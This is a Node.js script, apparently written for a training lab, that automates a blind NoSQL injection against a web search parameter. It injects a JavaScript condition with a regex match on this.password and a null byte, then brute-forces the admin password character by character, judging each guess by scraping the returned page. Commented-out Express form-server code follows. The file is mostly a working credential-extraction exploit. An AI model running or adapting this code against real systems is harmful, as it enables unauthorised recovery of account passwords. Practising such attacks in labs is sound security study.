/*
 * @Author: 1dayluo mar1sadaze@qq.com
 * @Date: 2022-08-25 13:03:03
 * @LastEditors: 1dayluo mar1sadaze@qq.com
 * @LastEditTime: 2022-08-26 14:35:14
 * @FilePath: /node-learn/code/scripts_try/nosql_injection_lab01.js
 * @Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
 */


// import { URLSearchParams } from 'url';
const http = require('http');

const express = require('express');
const util = require('util');
const Promise = this.Promise || require('promise');
const request = require('superagent-promise')(require('superagent'), Promise);
const e = require('express');


const base_url = "https://ptl-f19ca8ef-d845b601.libcurl.so/?search=admin'%20%26%26%20this.password.match(/^%s$/)%00";
const app = express();

// const wordlist = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','0','1','2','3','4','5','6','7','8','9']
const wordlist = [ 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','0','1','2','3','4','5','6','7','8','9','-']

var matched = '';
function if_success(res){
    // judge if injection success
    const cheerio = require('cheerio');
    // console.log('res is:',res);
    let $ = cheerio.load(res);
    mtch = false
    $('a').each((idx, ele)=>
    {
        a_text = $(ele).text();
        // console.log(a_text);
        if(a_text == 'admin'){
            // console.log('[+]Matched!')
            mtch = true;
        }
    });
    return mtch;
};


// iteral_wordlist();
async function find_match() {
try {
    for await (let letter of wordlist){
        // var letter = wordlist[i];
        var insert = matched + letter + '.*';
        console.log('[-]now.the insert is: ',insert);
        try{
            return_word = await request.get(util.format(base_url,insert)).end();
            if(if_success(return_word.res.text)){
                console.log(insert);
                matched = matched + letter;
                break;

            }
        } catch(e) {
            console.log('error',e,typeof(return_word.res.text));
        }
    }

    await matched;

} catch (e) {
    console.log("Failed to get");
}
}


(async()=>{

    // console.log('res:',res);
    while(matched.length<14) {
        now_match = await find_match();
        console.log('[*]now matched:',matched);
    }
})();




// http.createServer(function(req, res) {
//     let body = '';
//     var bufferts = [];
//     let htmlCotent =` 
//     <head>
//     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
//     <form  method="POST">
//     请输入对应的网站:<input name="target"><br>
//     <input type="submit"><br>
//     </from> `;
//     res.writeHead(200, { 'Content-Type': 'text/html' });
//     if (req.method == 'POST'){
//         req.on('data', function(chunk) {
//             bufferts.push(chunk);
//             // body += chunk;
//         });
//         req.on('end', () => {
//             const stringData = Buffer.concat(bufferts).toString();
//             var params = new URLSearchParams(stringData);
//             console.log('params',params.get('target'));
//             // var params = new URLSearchParams(body);
//             // console.log('Test:'+params.values().next());
//             // console.log(params);
//             if(params.get('target'))
//             {
//                 target = params.get('target');
//                 res.write('Output:');
//                 res.write(params.get('target'));
//                 return_res = get_websites(target,'111');
//                 res.write('<br>');
//                 // res.write(return_res);
//             }
//             else{
//                 res.write(htmlCotent);
//             }
//             res.end();
//         });
// } else {
//     res.write(htmlCotent);
// }
        
    

//     // get_websites('test');

// }).listen();

// let server = app.listen(9233,function(){
//     let host = server.address().address;
//     let port = server.address().port;
//     console.log('Your App is running at http://%s:%s',host,port);
// });

// app.get('/', async(req, res,next) => {
//     let htmlCotent =` 
//     <head>
//     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
//     <form  method="POST">
//     请输入对应的网站:<input name="target"><br>
//     <input type="submit"><br>
//     </from> `;
//     res.send(htmlCotent);
// })
